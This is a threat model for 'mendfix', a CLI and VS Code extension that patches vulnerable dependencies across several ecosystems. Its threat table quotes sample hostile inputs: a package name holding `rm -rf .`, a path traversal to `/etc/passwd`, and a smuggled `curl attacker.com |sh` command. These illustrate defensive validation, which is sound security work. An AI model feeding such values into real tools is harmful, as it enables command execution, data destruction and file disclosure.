# Threat Model — mend-autofixer

**Version:** 1.0  
**Date:** 2026-08-21  
**Scope:** CLI (`mendfix`), VS Code extension, portfolio mode  

---

## System Overview

`mendfix` is a Node.js CLI that reads vulnerability reports from 9 scanner providers (Mend, Snyk, npm-audit, Dependabot, OWASP, OSV, Trivy, GitLab, Xray) and automatically remediates CVEs by:

- Writing `overrides` entries into `package.json` (npm)
- Writing `<dependencyManagement>` patches into `pom.xml` (Maven)
- Writing version pins into `requirements.txt` / `pyproject.toml` (Python)
- Writing `replace` directives into `go.mod` (Go)
- Writing `PackageVersion` pins into `Directory.Packages.props` / `.csproj` (.NET)
- Writing `=version` pins into `Cargo.toml` (Rust)

After writing, it spawns the ecosystem's package manager (`npm`, `mvn`, `pip`, `go`, `cargo`, `dotnet`) to update lock files. A VS Code extension provides a sidebar UI over the same engine.

---

## Data Flow

```
[Vulnerability report file]  (JSON / Excel)
        |
        v
  [Provider parser]           src/providers/*.js
  (sanitize: name, version, CVE id)
        |
        v
  [Core engine]               src/core/
  semver-engine.js → phases.js → confidence.js → remediation-paths.js
  (deterministic; no shell; no external calls)
        |
        v
  [Ecosystem writer]          src/ecosystems/*/writer.js
  (writes patch files to --out-dir; optionally mutates target files)
        |
        v
  [Package manager spawn]     src/core/safe-exec.js
  npm / mvn / pip / go / cargo / dotnet
  (shell: false; allowlist; validated args; minimal env)
        |
        v
  [Lock file update]          package-lock.json / go.sum / Cargo.lock / etc.
        |
        v
  [Verification]              ecosystem installer verifyFixVersions()
```

**Trust boundary crossings:**

| From | To | Data crossed |
|------|----|-------------|
| Report file (filesystem) | Provider parser | JSON/Excel — untrusted names, versions, CVE IDs |
| Core engine | Ecosystem writer | PhasedItem[] — package names and versions |
| Ecosystem writer | Package manager process | Package name + version strings as CLI args |
| Package manager | Registry (npm/PyPI/etc.) | Version lookups (HTTPS) |
| CLI → GitHub/GitLab/AzDO/Bitbucket | PR/MR APIs | PR title/body generated from report data |

---

## Trust Boundaries

| Boundary | Trust level | Notes |
|----------|------------|-------|
| User filesystem (report files, lock files) | Untrusted input | Reports may originate from third-party scanners or CI pipelines |
| Package registries (npm, PyPI, Maven Central, crates.io, NuGet, Go proxy) | Semi-trusted | HTTPS; no pinning; MITM and substitution attacks possible |
| CI/CD environment | Privileged | mendfix may run with repo write credentials; CI runner may have elevated permissions |
| VS Code extension webview | Untrusted (sandboxed) | Webview renders HTML; CSP enforced; no direct token access |
| Generated output (markdown, JSON, PR bodies) | Untrusted for rendering | Output derived from report data; must not be interpreted as code |

---

## Threats and Mitigations

| # | Threat | Attack vector | Mitigation | Residual risk |
|---|--------|--------------|------------|---------------|
| T1 | Shell injection via package name/version | Malicious report contains `` `rm -rf .` `` as a package name; passed to `npm install --package-lock-only name@version` | **M1.1 safe-exec.js**: `validatePackageName` and `validateVersion` reject shell metacharacters and null bytes; `safeSpawn` uses `shell: false`; args passed as array, never interpolated into a string | Undetected metacharacters in npm's own scope handling; mitigated by allowlisted executables |
| T2 | Credential exposure in process list | User passes `--github-token ghp_xxx` on CLI; token visible in `ps aux` / shell history | **M1.2**: Deprecation warning emitted to stderr when any `--*-token` arg is used; env vars (`GITHUB_TOKEN`, etc.) preferred; extension spawns CLI without tokens | Shell history may still record the flag until users switch to env vars |
| T3 | Path traversal via report-derived file paths | Report contains `"dependencyFile": "../../../../etc/passwd"` | `validatePath` in safe-exec.js rejects null bytes and shell metacharacters; writers resolve paths relative to explicit `--out-dir`; no writes to paths derived from report content | Writers use `path.join(outDir, knownFilename)` — out-dir is always caller-controlled |
| T4 | Malicious vulnerability report (injected package names) | Attacker-controlled JSON with a package name like `lodash; curl attacker.com \|sh` | `validatePackageName` allowlist (scoped names, alphanumeric + `-_./`) rejects injection payload before any process spawn | Unusual but valid npm package names (e.g. with `.`) accepted; scope of validation limited to spawn args |
| T5 | Registry MITM / package substitution | npm registry returns a malicious package version when `npm install` runs | HTTPS enforced by npm client; lock file verification (`verifyFixVersions`) checks resolved version post-install; Phase A rollback on mismatch | No certificate pinning; npm registry integrity hashes not independently verified by mendfix |
| T6 | CI/CD privilege escalation | mendfix runs in CI with repo write credentials; malicious report causes writes outside `--out-dir` | All output paths are constructed from `--out-dir` (caller-controlled) + fixed filenames; no path derived from report content is written to; `--dry-run` default recommended for CI | If CI runner has write access to protected branches and `--commit` is set, auto-commit runs with those credentials |
| T7 | Malicious dep-tree manipulation | Attacker supplies a crafted `package-lock.json` that causes the engine to misclassify a MAJOR_BUMP as Phase A | Phase A classification requires `upgradeType !== MAJOR_BUMP`; MAJOR_BUMP is determined by `semver.major(fixVersion) > semver.major(currentVersion)` on report data, not lock data | Lock data influences Phase B→A reclassification (range validation); crafted lock could suppress a Phase B item's range violation, allowing a riskier override |
| T8 | Report-derived content in PRs/commits | Package name or CVE description containing Markdown/HTML in PR body rendered in GitHub UI | PR body is Markdown generated from `libraryName`, `recommendedVersion`, CVE IDs — all validated as safe tokens; no raw HTML; no `<script>` tags generated | Markdown-native injection (e.g. `[text](javascript:...)`) not explicitly escaped in generated PR body |

---

## Residual Risks

1. **npm parent-upgrade explorer** (`--verify-versions --lock-file`): spawns multiple `npm install --package-lock-only` processes in temp directories using the target repo's `package.json`. If the target repo's deps contain lifecycle scripts (`preinstall`, `postinstall`), those scripts execute in the temp dir. Mitigation: use `--ignore-scripts` in simulator; currently partially applied.

2. **Simulation limit bypass**: The parent-upgrade explorer is capped at 20 simulations per run. A report with many MAJOR_BUMP items hitting the cap will have unexplored upgrade paths — they stay Phase C, which is the safe default.

3. **Markdown injection in generated output**: CVE IDs and package names from reports are used in generated markdown without HTML-escaping. Most scanners produce safe CVE IDs (`CVE-2021-12345`); unusual package names could inject Markdown link syntax.

4. **Registry response trust**: Registry version lists are fetched over HTTPS but not independently signed. A compromised registry or intercepted response could cause `resolveToAvailableVersion` to return a malicious version; lock file verification post-install is the backstop.

---

## Out of Scope

- Vulnerabilities in the dependency packages mendfix itself installs (`node_modules`)
- Security of the CI/CD platform itself (GitHub Actions runner, GitLab CI, etc.)
- Social engineering attacks against users reviewing Phase B/C recommendations
- Vulnerabilities in scanner providers upstream of mendfix (report integrity is not verified)
- Tauri/Electron/Chrome extension surfaces (not built in current phases)
